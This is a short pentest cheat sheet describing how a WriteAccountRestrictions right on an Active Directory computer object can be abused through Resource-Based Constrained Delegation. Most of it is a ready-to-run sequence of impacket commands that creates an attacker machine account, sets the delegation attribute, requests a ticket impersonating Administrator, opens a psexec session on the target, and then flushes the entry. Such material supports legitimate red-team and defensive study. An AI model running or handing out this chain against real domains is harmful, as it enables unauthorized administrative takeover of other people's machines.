# WriteAccountRestrictions → RBCD → Local Admin Impersonation

`WriteAccountRestrictions` on a machine account lets you write its `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, enabling Resource-Based Constrained Delegation (RBCD). You create a machine account you control, configure it as an allowed delegator, and request a service ticket impersonating any user (e.g., Administrator) on the target machine.

## Steps

```bash
# 1. Create a machine account (MachineAccountQuota must be > 0, default is 10)
impacket-addcomputer <DOMAIN>/<user>:<pass> -computer-name attacker$ \
  -computer-pass 'P@ss1234' -dc-ip <DC-IP>

# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on target machine
#    (requires WriteAccountRestrictions on the target computer object)
impacket-rbcd <DOMAIN>/<user>:<pass> -dc-ip <DC-IP> \
  -delegate-to <TARGET-MACHINE>$ -delegate-from attacker$ -action write

# 3. Get TGT for the fake machine account
impacket-getTGT <DOMAIN>/attacker$:'P@ss1234' -dc-ip <DC-IP>
export KRB5CCNAME=attacker\$.ccache

# 4. Request S4U2Self + S4U2Proxy ticket impersonating Administrator
impacket-getST -spn cifs/<TARGET-MACHINE>.<DOMAIN> \
  -impersonate Administrator \
  <DOMAIN>/attacker$:'P@ss1234' -dc-ip <DC-IP>
export KRB5CCNAME=Administrator@cifs_<TARGET>.<DOMAIN>.ccache

# 5. Use ticket
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<TARGET-MACHINE>.<DOMAIN>
```

## Cleanup

```bash
# Remove the RBCD entry after use
impacket-rbcd <DOMAIN>/<user>:<pass> -dc-ip <DC-IP> \
  -delegate-to <TARGET-MACHINE>$ -delegate-from attacker$ -action flush
```

Note: BloodHound shows this as `WriteAccountRestrictions` edge from the attacker account to the target computer.
